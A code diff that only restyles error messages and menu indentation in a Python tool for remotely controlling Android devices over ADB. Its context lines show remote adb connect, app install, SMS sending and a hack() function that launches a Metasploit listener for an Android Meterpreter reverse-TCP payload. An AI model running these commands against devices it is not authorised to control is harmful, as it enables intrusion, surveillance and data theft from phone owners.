@@ -140,7 +140,7 @@ def connect():
     ip = input("> ")
     if ip == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         os.system("adb connect " + ip + ":5555")
 
@@ -284,7 +284,7 @@ def push_file():
     location = input(f"\n{color.CYAN}Enter file path{color.WHITE} > ")
     if location == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         destination = input(
             f"\n{color.CYAN}Enter destination path              {color.YELLOW}Example : /sdcard/Documents{color.WHITE}\n> /sdcard/")
@@ -301,7 +301,7 @@ def install_app():
 
     if file_location == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         os.system("adb install " + file_location)
         print("\n")
@@ -314,7 +314,7 @@ def uninstall_app():
 
     if package_name == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         os.system("adb uninstall " + package_name)
         print("\n")
@@ -327,7 +327,7 @@ def launch_app():
 
     if package_name == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         os.system("adb shell monkey -p " + package_name + " 1")
         print("\n")
@@ -336,8 +336,8 @@ def launch_app():
 def list_apps():
     print(f'''
 
-{color.WHITE}1.{color.GREEN} List third party packages {color.WHITE}
-{color.WHITE}2.{color.GREEN} List all packages {color.WHITE}
+    {color.WHITE}1.{color.GREEN} List third party packages {color.WHITE}
+    {color.WHITE}2.{color.GREEN} List all packages {color.WHITE}
     ''')
     mode = (input("> "))
 
@@ -347,7 +347,7 @@ def list_apps():
         os.system("adb shell pm list packages")
     else:
         print(
-            f'\n{color.RED}Invalid input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     print("\n")
 
 
@@ -371,10 +371,10 @@ def reboot(key):
         os.system('adb reboot')
     else:
         print(f'''
-{color.WHITE}1.{color.GREEN} Reboot to Recovery Mode
-{color.WHITE}2.{color.GREEN} Reboot to Bootloader
-{color.WHITE}3.{color.GREEN} Reboot to Fastboot Mode
-{color.WHITE}''')
+    {color.WHITE}1.{color.GREEN} Reboot to Recovery Mode
+    {color.WHITE}2.{color.GREEN} Reboot to Bootloader
+    {color.WHITE}3.{color.GREEN} Reboot to Fastboot Mode
+    {color.WHITE}''')
         mode = (input("> "))
         if mode == '1':
             os.system('adb reboot recovery')
@@ -383,7 +383,8 @@ def reboot(key):
         elif mode == '3':
             os.system('adb reboot fastboot')
         else:
-            print("\nInvalid selection, Going back to Main Menu")
+            print(
+                f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
             return
 
     print("\n")
@@ -476,7 +477,7 @@ def hack():
         os.system(
             f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'")
     else:
-        print('\nGoing Back to Main Menu...\n')
+        print('\nGoing Back to Main Menu\n')
 
 
 def copy_whatsapp():
@@ -703,7 +704,7 @@ def open_link():
 
     if url == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         print(f'\n{color.YELLOW}Opening "{url}" on device        \n{color.WHITE}')
         os.system(f'adb shell am start -a android.intent.action.VIEW -d {url}')
@@ -716,7 +717,7 @@ def open_photo():
 
     if location == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
 
         os.system("adb push " + location + " /sdcard/")
@@ -744,7 +745,7 @@ def open_audio():
 
     if location == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         os.system("adb push " + location + " /sdcard/")
 
@@ -778,7 +779,7 @@ def open_video():
 
     if location == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         os.system("adb push " + location + " /sdcard/")
 
@@ -822,17 +823,17 @@ def get_device_info():
     wifi_interface = os.popen(f'adb shell getprop wifi.interface').read()
 
     print(f'''
-{color.YELLOW}Model :{color.WHITE} {model}\
-{color.YELLOW}Manufacturer :{color.WHITE} {manufacturer}\
-{color.YELLOW}Chipset :{color.WHITE} {chipset}\
-{color.YELLOW}Android Version :{color.WHITE} {android}\
-{color.YELLOW}Security Patch :{color.WHITE} {security_patch}\
-{color.YELLOW}Device :{color.WHITE} {device}\
-{color.YELLOW}SIM :{color.WHITE} {sim}\
-{color.YELLOW}Encryption State :{color.WHITE} {encryption_state}\
-{color.YELLOW}Build Date :{color.WHITE} {build_date}\
-{color.YELLOW}SDK Version :{color.WHITE} {sdk_version}\
-{color.YELLOW}WiFi Interface :{color.WHITE} {wifi_interface}\
+    {color.YELLOW}Model :{color.WHITE} {model}\
+    {color.YELLOW}Manufacturer :{color.WHITE} {manufacturer}\
+    {color.YELLOW}Chipset :{color.WHITE} {chipset}\
+    {color.YELLOW}Android Version :{color.WHITE} {android}\
+    {color.YELLOW}Security Patch :{color.WHITE} {security_patch}\
+    {color.YELLOW}Device :{color.WHITE} {device}\
+    {color.YELLOW}SIM :{color.WHITE} {sim}\
+    {color.YELLOW}Encryption State :{color.WHITE} {encryption_state}\
+    {color.YELLOW}Build Date :{color.WHITE} {build_date}\
+    {color.YELLOW}SDK Version :{color.WHITE} {sdk_version}\
+    {color.YELLOW}WiFi Interface :{color.WHITE} {wifi_interface}\
 ''')
 
 
@@ -851,7 +852,7 @@ def send_sms():
 
     if number == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
         message = input(
             f'{color.YELLOW}\nEnter your message {color.WHITE}> ')
@@ -940,7 +941,7 @@ def extract_apk():
 
     if package_name == '':
         print(
-            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
+            f'\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}')
     else:
 
         global pull_location
@@ -967,9 +968,9 @@ def extract_apk():
 
 def mirror():
     print(f'''
-{color.WHITE}1.{color.GREEN} Default Mode
-{color.WHITE}2.{color.GREEN} Custom Mode {color.YELLOW}(Tweak settings to increase performance)
-{color.WHITE}''')
+    {color.WHITE}1.{color.GREEN} Default Mode
+    {color.WHITE}2.{color.GREEN} Custom Mode {color.YELLOW}(Tweak settings to increase performance)
+    {color.WHITE}''')
     mode = input("> ")
     if mode == '1' or mode == '':
         os.system('scrcpy')
@@ -993,7 +994,8 @@ def mirror():
 
         os.system(f'scrcpy {size} {bitrate} {framerate}')
     else:
-        print("\nInvalid selection, Going back to Main Menu")
+        print(
+            f'\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}')
         return
     print('\n')
 
